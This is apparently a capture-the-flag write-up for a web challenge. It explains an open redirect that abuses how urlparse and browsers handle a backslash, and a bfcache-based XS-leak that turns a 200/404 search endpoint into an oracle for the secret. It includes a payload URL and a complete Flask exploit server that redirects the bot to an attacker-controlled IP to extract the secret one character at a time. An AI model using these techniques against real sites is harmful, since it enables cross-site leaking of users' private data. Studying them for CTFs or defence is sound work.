# web/extend-note

There were two relevant details about this challenge - 
1. Open Redirect. `urlparse` has a parser differential with browser where it thinks `\` is part of hostname, but browsers convert it to `/` ending the hostname part. 
2. We had a search oracle on /append which checked if the prefix we give is part of existing notes, and based on that return 200 or 404. We can use this to build the secret char by char.


Open redirect could be used like - 
`http://localhost:4000/append?content=test&url=http://<your domain>\@localhost:4000`

Now the issue is browser executes JS despite being 200 or 404 page, and results in successful redirect. The redirect passes no info to us. The difference lies in caching. BFCache is used to restore windows without re rendering html or running JS. Chrome DevTools explictly states, *Only pages with a status code of 2XX can be cached.*. 

This means if after redirect we were to go back in history, 404 page's JS would rerun, resulting in redirect to our site again, BUT, if the page was 200 OK, bfcache won't run the JS again, resulting in no further redirects! So all we have to do is check if a prefix is resulting two redirects or one. 


```py
from flask import Flask, render_template, render_template_string, request
app = Flask(__name__)

known_prefix = ""
d = {"a":0, "b":0, "c":0, "d":0, "e":0, "f":0, "0":0, "1":0, "2":0, "3":0, "4":0, "5":0, "6":0, "7":0, "8":0, "9":0}
host = ""
my_ip = ""
print("submit this url - \n", f"https://{host}/append?content={known_prefix}a&url=http://{my_ip}\\@{host}/../check?x={known_prefix}a")
@app.route('/check')
def check():
    guess = list(request.args.get("x"))[-1]
    if guess  in d:
        d[guess] += 1
        if d[guess] == 2:
            print("Found 2 requests for " + request.args.get("x"))
            for key in d:
                if d[key] == 0:
                    return render_template_string(f"""<script>window.location.href = "https://{host}/append?content={known_prefix}{key}&url=http://{my_ip}\\\\@{host}/../check?x={known_prefix}{key}" </script>""")
    return render_template_string("""<script>window.history.back()</script>""")

if __name__ == '__main__':
    app.run(debug=True)
```

Then just submit the url to bot till you get all 8 chars of secret.
